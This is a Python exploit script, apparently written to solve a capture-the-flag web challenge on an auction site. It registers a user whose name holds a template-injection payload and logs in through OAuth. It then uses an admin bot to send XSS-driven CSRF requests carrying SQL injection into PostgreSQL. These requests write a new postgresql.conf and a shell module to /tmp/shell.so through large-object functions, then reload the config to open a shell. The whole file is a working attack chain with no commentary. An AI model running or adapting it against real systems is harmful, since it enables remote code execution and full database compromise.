import requests
import base64
from urllib.parse import quote
import time

url = "http://83.136.249.227:47313"

session = requests.session()

csti_payload = "'> ${this.constructor.constructor('eval(decodeURIComponent(location.search.substr(3)))')()}"
auth_data={"username": csti_payload, "password": "sebb"}

def register():
    session.post(f"{url}/oauth/register", data=auth_data)

def login():
    r = session.post(f"{url}/oauth/login", data=auth_data)
    if "User Information" not in r.text:
        print("Failed to login")
        return
    cid = session.get(f"{url}/api/config").json()["oauthClientId"]
    r = session.post(f"{url}/oauth/authorize", data={"response_type": "code", "client_id": cid, "redirect_uri": "/callback", "scope": "read", "state": "", "approve": "true"}, allow_redirects=False)
    # Extract auth code from the redirect URL
    try:
        auth_code = r.headers.get("Location").split("code=")[1]
    except:
        print(r.text)
        print("Failed to get auth code")
        return
    session.post(f"{url}/api/oauthLogin", data={"code": auth_code})

def place_bid():
    session.post(f"{url}/api/auctions/1/bids", json={"bid": "70"})
    
def build_xss_payload(json):
    xss_payload = f"fetch('http://127.0.0.1:1337/table', {{method: 'POST', body: JSON.stringify({json}), headers: {{'Content-Type': 'application/json'}}}})"
    return xss_payload

def csrf(json):
    xss_payload = build_xss_payload(json)
    r = session.post(f"{url}/api/submissions", json={"name":"xxx","description":"xxx","url":f"http://127.0.0.1:1337/auction/1?c={quote(xss_payload)}","category":"lore"})
    print(r.text)

def exploit():
    try:
        # write config file
        print("Writing config file")
        with open('postgresql.conf', 'rb') as f:
            conf = f.read().hex()
            conf = bytes.fromhex(conf)
            conf = base64.b64encode(conf).decode()
            csrf({"tableName": f"users\" union select 1,'a',(SELECT lo_from_bytea(133337, decode('{conf}', 'base64')))::text-- -"})
            time.sleep(12) # wait the bot to finish
            csrf({"tableName": f"users\" union select 1,'a',(SELECT lo_export(133337, '/var/lib/postgresql/data/postgresql.conf'))::text-- -"})
            time.sleep(12)

        # write shell module
        print("Writing shell module")
        id = 133338
        for i in range(0, 14336, 2048):
            chunk_file = f"shell_chunks/base64_{i}"
            with open(chunk_file, "rb") as f:
                shell = f.read().decode()
                if i == 0:
                    csrf({"tableName": f"users\" union select 1,'a',(SELECT lo_from_bytea({id}, decode('{shell}', 'base64')))::text-- -"})
                else:
                    csrf({"tableName": f"users\" union select 1,'a',(SELECT lo_put({id}, {i}, decode('{shell}', 'base64')))::text-- -"})
            time.sleep(12)

        csrf({"tableName": f"users\" union select 1,'a',(SELECT lo_export({id}, '/tmp/shell.so'))::text-- -"})
        time.sleep(12)
        # reload the config
        print("Reloading the config")
        csrf({"tableName": f"users\" union select 1,'a',(SELECT pg_reload_conf())::text-- -"})

        # get the shell
        time.sleep(12)
        session.get(f"{url}/submissions")
        print("Check your shell :)")

    except Exception as e:
        print(e)

if __name__ == "__main__":
    register()
    login()
    place_bid()
    print("Logged in, exploit started")
    exploit()